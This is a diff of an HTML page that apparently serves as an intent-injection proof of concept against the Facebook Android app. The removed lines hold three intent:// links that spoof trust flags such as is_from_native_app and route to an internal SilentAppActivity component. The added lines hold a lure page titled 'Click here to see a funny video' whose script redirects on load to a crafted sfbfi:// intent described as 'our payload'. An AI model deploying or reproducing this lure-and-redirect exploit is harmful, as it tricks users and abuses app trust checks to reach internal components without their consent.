@@ -1,31 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>WebView Escape + Intent Injection</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9;}
-        a { display: block; margin: 20px; padding: 20px; background-color: #0084ff; color: white; text-decoration: none; font-size: 18px; border-radius: 8px; font-weight: bold; }
-    </style>
-</head>
 <body>
-    <h2>Intent Injection Bypass:</h2>
-
-    <!-- TARGET 1: FB Avatar with Spoofed Trust Flags -->
-    <!-- We inject B.is_from_native_app=true; and B.from_internal_process=true; -->
-    <a href="intent://avatar/#Intent;scheme=fb;package=com.facebook.katana;B.is_from_native_app=true;B.from_internal_process=true;B.force_in_app=true;end;">
-        1. Injected FB Avatar Canary
-    </a>
-
-    <!-- TARGET 2: FB Bloks Canary with Spoofed Trust Flags -->
-    <a href="intent://bloks/?app_id=com.bloks.www.screen_query.BloksUSFPrivacyCheckupRootScreenQuery#Intent;scheme=fb;package=com.facebook.katana;B.is_from_native_app=true;B.from_internal_process=true;end;">
-        2. Injected FB Bloks Canary
-    </a>
-
-    <!-- TARGET 3: SilentAppActivity Component Routing -->
-    <!-- Instead of fb://, we force the WebView to hit our sfbfi:// router directly! -->
-    <a href="intent://?bn=Y29tLmZhY2Vib29rLmthdGFuYQ==&bplo=bloks/&app_id=com.bloks.www.screen_query.BloksUSFPrivacyCheckupRootScreenQuery#Intent;scheme=sfbfi;package=com.facebook.katana;component=com.facebook.katana/com.facebook.silentapp.SilentAppActivity;end;">
-        3. Route via SilentAppActivity Router
-    </a>
-
+    <h1>Click here to see a funny video</h1>
+    <script>
+        // Forces the browser to open the Facebook app with our payload
+        window.location.href = "intent://test?bn=Y29tLmZhY2Vib29rLmthdGFuYQ==&bplo=avatar#Intent;scheme=sfbfi;package=com.facebook.katana;end;";
+    </script>
 </body>
 </html>
